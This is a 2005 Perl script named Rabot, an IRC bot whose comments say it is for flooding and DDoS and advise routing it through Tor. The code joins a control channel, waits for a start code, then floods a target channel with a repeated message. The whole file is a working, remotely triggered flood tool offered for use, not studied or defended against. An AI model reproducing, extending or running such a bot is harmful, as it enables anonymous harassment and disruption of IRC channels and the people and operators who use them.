#!/usr/local/bin/perl

# Rabot 0.1                       
# Copyright 2005 lasg@lasg.dk               

# Rabot is a simple example of an IRC-bot,
#  which can be used for stupid things like flooding/ddos'ing.
#
# It is working fine with TOR. If you have a working TOR installation,
#  you can use torify to tunnel it through. 
#
# Syntax for rabot.pl:
# ./rabot.pl <server> <port> <nickname> <username> <realname> <channel> \
#   <control channel> <startcode> <writetimes> <message>
# Example:
# ./rabot.pl irc.idiots.com 6667 Rabot rabot "Real Rabot" #rabot \ 
#   #rabotcontrol startfun 5 "Hello World!"
#
# This code is originally based on some random perl examples.
# If you think it's ugly, go fix it, and mail me :)

use IO::Socket;

$nicknamerand = int(rand(8999)) + 1000;

$server = "$ARGV[0]";
$port = $ARGV[1];
$nickname = "${ARGV[2]}"."${nicknamerand}";
$username = "$ARGV[3]";
$realname = "$ARGV[4]";

$channel = "$ARGV[5]";
$controlchannel = "$ARGV[6]";
$startcode = "$ARGV[7]";
$writetimes = "$ARGV[8]";
$message = "$ARGV[9]";

$sock = new IO::Socket::INET(PeerAddr => $server, PeerPort => $port, Proto => 'tcp') or die "Can't connect\n";

print $sock "NICK ${nickname}\r\n";
print $sock "USER ${username} 8 * :${realname}\r\n";

while ($input = <$sock>) {
    # Check the numerical responses from the server.
    if ($input =~ /004/) {
        # We are now logged in.
        last;
    }
    elsif ($input =~ /433/) {
        die "Nickname is already in use.";
    }
}

# Join the channel.
print $sock "JOIN $controlchannel\r\n";

# Keep reading lines from the server.
while ($input = <$sock>) {
    chop $input;
    if ($input =~ /PING/) {
        print $sock "PONG $1\r\n";
    }
    else {
        # Print the raw line received by the bot.
        print "$input\n";
    }

	if ($input =~ /PRIVMSG ${controlchannel} :${startcode}/) {
		print $sock "JOIN $channel\r\n";
		until ( $writeactual == ${writetimes} ){
			print $sock "PRIVMSG ${channel} :${message}!\r\n";
			sleep(1);
			$writeactual++;
		}
		exit 1;
	}
}

